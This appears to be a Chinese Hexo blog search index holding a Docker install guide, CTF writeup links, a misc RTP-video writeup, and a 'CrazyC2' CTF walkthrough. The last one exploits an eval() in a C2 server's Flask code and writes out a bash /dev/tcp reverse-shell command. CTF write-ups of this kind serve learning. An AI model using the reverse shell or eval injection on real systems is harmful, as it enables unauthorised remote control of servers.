<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>docker安装使用记录（极简版）</title>
      <link href="/2024/07/20/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/07/20/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>用到哪里写到哪里吧，随着使用的深入以后还会更新这篇文章</p></blockquote><p>参考文章传送门：</p><p><ahref="https://blog.csdn.net/u012563853/article/details/125295985?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172148665016800188528574%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172148665016800188528574&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125295985-null-null.142%5Ev100%5Epc_search_result_base1&amp;utm_term=ubuntu%20docker&amp;spm=1018.2226.3001.4187">文章一</a>，<ahref="https://blog.csdn.net/q610376681/article/details/90483576?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172136879616800211563088%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172136879616800211563088&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-90483576-null-null.142%5Ev100%5Epc_search_result_base1&amp;utm_term=docker&amp;spm=1018.2226.3001.4187">文章二</a>，<ahref="https://blog.csdn.net/jsnhux/article/details/89847109">文章三</a></p><h2 id="docker简介">Docker简介</h2><h3 id="docker介绍">docker介绍</h3><p>Docker是一个可以用来装web应用的容器。Docker这个词的本义是码头工人，主要工作就是搬运那些“集装箱”，将它们搬运到相应的目的地去。Docker拥有着一个“超级码头”，或者说一个巨大的物流中心，我们可以把我们的“集装箱”push到这个超级码头去，以便我们在另一个码头时可以将它直接pull过来，而不是就地复刻一个曾经我们拥有过的集装箱。</p><p>有些文章中会拿docker和虚拟机作对比，深入而又透彻，什么使用了LXC技术，不需要HyperV转换之类的，这里我就不再赘述了，总结来说就是docker容器更为轻量，运行起来更为快速。</p><h3 id="镜像">镜像</h3><p>镜像，英文image，也就是上面我们提到的”集装箱“，我们的那个”超级码头“也就是镜像源。镜像的联合文件系统我也不再在这里赘述，感兴趣可以自行跳入上面的传送门去了解。</p><h3 id="容器">容器</h3><p>容器，英文名container，可以理解为镜像的实例化。镜像是不可编辑的，容器是可以编辑的。我们可以用一个镜像生成多个容器。容器与容器之间互不干扰。</p><h2 id="docker安装">Docker安装</h2><p>说明：笔者电脑系统为Ubuntu 24.04LTS，下面的操作都在root权限下进行</p><h3 id="卸载旧版">卸载旧版</h3><p>如果以前安装过，那么先卸载一下旧版docker，没有则无需卸载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure><h3 id="安装证书">安装证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ca-certificates curl gnupg lsb-release</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><h3 id="写入软件源">写入软件源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository <span class="string">&quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu <span class="subst">$(lsb_release -cs)</span> stable&quot;</span></span><br></pre></td></tr></table></figure><h3 id="安装docker">安装docker</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><h3 id="启动docker">启动docker</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><h3 id="安装一些工具">安装一些工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure><p>重启一下docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure><h3 id="配置阿里云镜像加速器">配置阿里云镜像加速器</h3><p>登录你的阿里云账号，<a href="https://dev.aliyun.com">传送门</a></p><p>点左上角三条杠--容器--容器镜像服务ACR--镜像工具--镜像加速器</p><figure><img src="/images/docker安装记录/image-20240720234631745.png"alt="image-20240720234631745" /><figcaption aria-hidden="true">image-20240720234631745</figcaption></figure><figure><img src="/images/docker安装记录/屏幕截图-2024-07-20-234712.png"alt="屏幕截图 2024-07-20 234712" /><figcaption aria-hidden="true">屏幕截图 2024-07-20 234712</figcaption></figure><p>网站上已经详细地说明了操作步骤，这里我还是将它一步一步分开说一下</p><p>/etc/docker应该是已经存在了，如果没有的话就用下面的命令去创建一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /etc/docker</span><br></pre></td></tr></table></figure><p>在/etc/docker路径下创建一个叫daemon.json的文件，编辑其内容如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;https://这里填上面给的地址.mirror.aliyuncs.com&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>重新加载一下daemon</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure><p>重启docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h3 id="测试安装是否成功">测试安装是否成功</h3><p>我们先拉取一个hello-world的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull hello-world</span><br></pre></td></tr></table></figure><p>运行一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><p>如果出现以下界面，则说明安装成功</p><figure><img src="/images/docker安装记录/截图-2024-07-21-00-11-44.png"alt="截图 2024-07-21 00-11-44" /><figcaption aria-hidden="true">截图 2024-07-21 00-11-44</figcaption></figure><h2 id="docker简单命令">Docker简单命令</h2><p>拉取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull 镜像名</span><br></pre></td></tr></table></figure><p>删除本地镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi 镜像名</span><br></pre></td></tr></table></figure><p>查看本地拥有的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>用某一镜像开启一个容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run 镜像名</span><br></pre></td></tr></table></figure><p>开启容器时在后台运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d 镜像名</span><br></pre></td></tr></table></figure><p>查看当前运行中的容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p>查看存在的容器（包括不在运行中的）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>停止运行某一容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop 容器ID（可通过上面的ps命令看到，可仅写ID的前几位）</span><br></pre></td></tr></table></figure><p>删除某一容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> 容器ID</span><br></pre></td></tr></table></figure><p>进入某一容器，以bash界面运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 容器ID bash</span><br></pre></td></tr></table></figure><p>想退出容器，则输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h2 id="docker网络">Docker网络</h2><p>说明：下文中客户端ip：192.168.3.18，服务端ip：192.168.3.25</p><p>这里简述一下如何在docker中跑一个对外的web服务，用nginx镜像举例</p><p>首先pull一下nginx的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull nginx</span><br></pre></td></tr></table></figure><figure><img src="/images/docker安装记录/截图-2024-07-21-14-08-49.png"alt="截图-2024-07-21-14-08-49" /><figcaption aria-hidden="true">截图-2024-07-21-14-08-49</figcaption></figure><p>如果我们想让服务跑在服务端主机的11451端口，容器内跑在80端口，那么得用如下命令，在启动容器时做一个端口映射。<strong>注意记得开启服务端主机的11451端口。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 11451:80 nginx</span><br></pre></td></tr></table></figure><figure><img src="/images/docker安装记录/截图-2024-07-21-14-16-37.png"alt="截图-2024-07-21-14-16-37" /><figcaption aria-hidden="true">截图-2024-07-21-14-16-37</figcaption></figure><p>这里我们可以看一下这个容器的ID和运行情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><figure><img src="/images/docker安装记录/截图-2024-07-21-14-18-55.png"alt="截图-2024-07-21-14-18-55" /><figcaption aria-hidden="true">截图-2024-07-21-14-18-55</figcaption></figure><p>可以看到已经成功运行了。</p><p>此时我们就可以用客户端浏览器去访问服务端的11451端口了，如果看到如下页面，那么就说明成功了。</p><figure><img src="/images/docker安装记录/image-20240721142135086.png"alt="image-20240721142135086" /><figcaption aria-hidden="true">image-20240721142135086</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Technology </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Technology </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF2024 Writeup</title>
      <link href="/2024/06/01/LitCTF2024-Writeup/"/>
      <url>/2024/06/01/LitCTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="writeup"><ahref="https://www.blog.st4rr.top/writeups/LitCTF2024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> LitCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jqctf2024初赛 Misc</title>
      <link href="/2024/05/26/jqctf2024%E5%88%9D%E8%B5%9B-Misc/"/>
      <url>/2024/05/26/jqctf2024%E5%88%9D%E8%B5%9B-Misc/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是一次X1cT34m前辈们的狂欢（竟然直接给干到第一了！！？），我只是做个misc给前辈们助助兴。。。</p></blockquote><h3 id="flag_video_version">flag_video_version</h3><p><imgsrc="/images/jqctf2024初赛-Misc/屏幕截图%202024-05-26%20202344.png" /></p><p>从sdp.txt中得知视频通过RTP传输，编码方式为H264</p><p><imgsrc="/images/jqctf2024初赛-Misc/屏幕截图%202024-05-26%20202557.png" /></p><p>wireshark中Decode As RTP</p><p><imgsrc="/images/jqctf2024初赛-Misc/屏幕截图%202024-05-26%20202921.png" /></p><p>从RTP流分析中可以看出序列存在问题，将每一个分组对应的序列保存进2.txt</p><p><imgsrc="/images/jqctf2024初赛-Misc/屏幕截图%202024-05-26%20203245.png" /></p><p>追踪UDP流，将传输的内容保存进1.txt</p><p><img src="/images/jqctf2024初赛-Misc/屏幕截图 2024-05-26 203444.png" alt="屏幕截图 2024-05-26 203444" style="zoom:50%;" /></p><p>写脚本将这些数据包按照正常的顺序拼接起来，最终保存为data.264</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">f1=<span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f2=<span class="built_in">open</span>(<span class="string">&quot;2.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f3=<span class="built_in">open</span>(<span class="string">&quot;3.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">num=[]</span><br><span class="line">ls=[]</span><br><span class="line">a=f2.readline().strip()</span><br><span class="line"><span class="keyword">while</span>(a):</span><br><span class="line">    num.append(<span class="built_in">int</span>(a))</span><br><span class="line">    a=f2.readline().strip()</span><br><span class="line">b=f1.readline().strip()</span><br><span class="line"><span class="keyword">while</span>(b):</span><br><span class="line">    ls.append(b)</span><br><span class="line">    b=f1.readline().strip()</span><br><span class="line">sorted_ls = [x <span class="keyword">for</span> _, x <span class="keyword">in</span> <span class="built_in">sorted</span>(<span class="built_in">zip</span>(num, ls))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sorted_ls:</span><br><span class="line">    f3.write(i)</span><br><span class="line">    f3.write(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p><imgsrc="/images/jqctf2024初赛-Misc/image-20240526203853688.png" /></p><p>用MilkPlayer播放这个视频，视频展示了flag</p><p><imgsrc="/images/jqctf2024初赛-Misc/屏幕截图%202024-05-26%20204143.png" /></p><p>flag{ef051f0cd551650c8b6c9eac7b5ad861}</p><h3 id="checkin">checkin</h3><p>flag{605379906}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> jqctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2024 Writeup</title>
      <link href="/2024/05/19/CISCN2024-Writeup/"/>
      <url>/2024/05/19/CISCN2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="初赛writeup"><ahref="https://www.blog.st4rr.top/writeups/CISCN2024Writeup.pdf">初赛Writeup</a></h4><p>Additional Statement:</p><p>这是一次由四个大一新生组成的X2cT34m的奇妙冒险，</p><p>我参与做了crypto和一部分的misc</p><h4 id="华东北赛区赛writeup"><ahref="https://www.blog.st4rr.top/writeups/CISCN2024Writeup1.pdf">华东北赛区赛Writeup</a></h4><p>Additional Statement:</p><p>第一次打线下，AWDP模式。</p><p>太菜了，面对题目一脸懵（T0T）</p><p>但是听说是可以通过patch包传个马上去再攻击的（？？！），比赛时我们队虽然想到了但是没去试，还是打保守了。。。</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF2024 Writeup</title>
      <link href="/2024/04/29/2024-04-29-XYCTF2024-Writeup/"/>
      <url>/2024/04/29/2024-04-29-XYCTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="writeup"><ahref="https://f4k3r.top/pdf_file/XYCTF2024%20%E5%88%AB%E7%AE%A1%20Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>Cooperated with <strong>f4k3r</strong>.</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> XYCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X1ct34m 2024 Misc 招新题 CrazyC2</title>
      <link href="/2024/04/02/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/"/>
      <url>/2024/04/02/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本来在CTF中应该都是基操，但是因为本人太菜，弄了好几天才出。。。（T0T）</p></blockquote><p>题目</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402165312088.png"alt="image-20240402165312088" /><figcaption aria-hidden="true">image-20240402165312088</figcaption></figure><p>先是流量分析，看到了很多TCP和HTTP流，追踪大概看一下</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402164740735.png"alt="image-20240402164740735" /><figcaption aria-hidden="true">image-20240402164740735</figcaption></figure><p>看起来传输了很多加密的信息，先把它们全都手动整理出来</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402164916818.png"alt="image-20240402164916818" /><figcaption aria-hidden="true">image-20240402164916818</figcaption></figure><p>直接解base64解不出，但是POST传参时看到了一个random_key，猜是异或用的，果然</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402165223751.png"alt="image-20240402165223751" /><figcaption aria-hidden="true">image-20240402165223751</figcaption></figure><p>看到用curl从攻击机读取了一个文件，我也试着读了一下，发现可以从攻击机中读到任意文件，于是读到了第一个flag</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402165620146.png"alt="image-20240402165620146" /><figcaption aria-hidden="true">image-20240402165620146</figcaption></figure><p>从读一些不存在的文件产生的报错中可以看到pythonflask源码，读下来进行审计</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402165819762.png"alt="image-20240402165819762" /><figcaption aria-hidden="true">image-20240402165819762</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, send_file</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">clients = &#123;<span class="string">&quot;4ace608657cba629&quot;</span>: &#123;<span class="string">&quot;command&quot;</span>: <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;random_key&quot;</span>: <span class="number">95</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/init&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    client_id = secrets.token_hex(<span class="number">8</span>)</span><br><span class="line">    random_key = secrets.randbelow(<span class="number">255</span>)</span><br><span class="line">    clients[client_id] = &#123;<span class="string">&quot;command&quot;</span>: <span class="string">&quot;echo hello&quot;</span>, <span class="string">&quot;random_key&quot;</span>: random_key&#125;</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;client_id&quot;</span>: client_id, <span class="string">&quot;random_key&quot;</span>: random_key&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/recv&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_command</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    client_id = data[<span class="string">&quot;client_id&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(client_id, data[<span class="string">&quot;random_key&quot;</span>])</span><br><span class="line">    command = clients[client_id].get(<span class="string">&quot;command&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    encrypted_command = encrypt_command(</span><br><span class="line">        command, clients[client_id][<span class="string">&quot;random_key&quot;</span>])</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;encrypted_command&quot;</span>: encrypted_command&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/send&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_data</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    client_id = data[<span class="string">&quot;client_id&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">eval</span>(data[<span class="string">&quot;random_key&quot;</span>]) != clients[client_id][<span class="string">&quot;random_key&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;data error&quot;</span>, <span class="number">200</span></span><br><span class="line">    encrypted_data = data[<span class="string">&quot;data&quot;</span>]</span><br><span class="line">    decrypted_data = decrypt_data(</span><br><span class="line">        encrypted_data, clients[client_id][<span class="string">&quot;random_key&quot;</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Received data: <span class="subst">&#123;decrypted_data.decode()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Received data&quot;</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/files&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_file</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    client_id = data[<span class="string">&quot;client_id&quot;</span>]</span><br><span class="line">    random_key = data[<span class="string">&quot;random_key&quot;</span>]</span><br><span class="line">    path = data[<span class="string">&quot;path&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> client_id <span class="keyword">not</span> <span class="keyword">in</span> clients.keys():</span><br><span class="line">        <span class="keyword">return</span> jsonify(</span><br><span class="line">            &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid client_id&quot;</span>&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> clients[client_id][<span class="string">&quot;random_key&quot;</span>] == <span class="built_in">int</span>(random_key):</span><br><span class="line">        <span class="keyword">return</span> send_file(path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(</span><br><span class="line">            &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;incorrect random_key&quot;</span>&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_command</span>(<span class="params">command, key</span>):</span><br><span class="line">    encrypted_data = xor(command, key)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(encrypted_data).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_data</span>(<span class="params">encrypted_data, key</span>):</span><br><span class="line">    encrypted_data = base64.b64decode(encrypted_data)</span><br><span class="line">    <span class="keyword">return</span> xor(encrypted_data, key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_flask_app</span>():</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, debug=<span class="literal">True</span>, port=<span class="number">1337</span>, use_reloader=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flask_thread = Thread(target=run_flask_app)</span><br><span class="line">    flask_thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = <span class="built_in">input</span>(<span class="string">&quot;Enter command: &quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> client_id <span class="keyword">in</span> clients.keys():</span><br><span class="line">            clients[client_id][<span class="string">&quot;command&quot;</span>] = command</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Executing: <span class="subst">&#123;command&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>可以看到在判断random_key是否正确的地方存在一个我们CTFer最喜欢的eval，于是可以通过这个漏洞执行RCE</p><p>反弹shell拿下C2服务器</p><p>给攻击机传bash -c "bash -i &gt;&amp; /dev/tcp/ip/port0&gt;&amp;1"</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/屏幕截图-2024-04-02-170509.png"alt="屏幕截图 2024-04-02 170509" /><figcaption aria-hidden="true">屏幕截图 2024-04-02 170509</figcaption></figure><p>自己的服务器监听2333端口</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402170726047.png"alt="image-20240402170726047" /><figcaption aria-hidden="true">image-20240402170726047</figcaption></figure><p>ps aux查看一下运行的程序</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402171043213.png"alt="image-20240402171043213" /><figcaption aria-hidden="true">image-20240402171043213</figcaption></figure><p>可以看到C2服务器是用tmux运行的，那么用tmux回到这个会话（后来开放了ssh，用ssh连，先把自己的公钥配置进去，这里不再赘述）</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402180037287.png"alt="image-20240402180037287" /><figcaption aria-hidden="true">image-20240402180037287</figcaption></figure><p>有点问题，那么就先把前面的tmux进程kill了再启动，根据它给的id和key改一下server.py，kill了再启动</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402180438620.png"alt="image-20240402180438620" /><figcaption aria-hidden="true">image-20240402180438620</figcaption></figure><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402180615128.png"alt="image-20240402180615128" /><figcaption aria-hidden="true">image-20240402180615128</figcaption></figure><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402180708976.png"alt="image-20240402180708976" /><figcaption aria-hidden="true">image-20240402180708976</figcaption></figure><p>输指令反弹shell</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/屏幕截图-2024-04-02-180909.png"alt="屏幕截图 2024-04-02 180909" 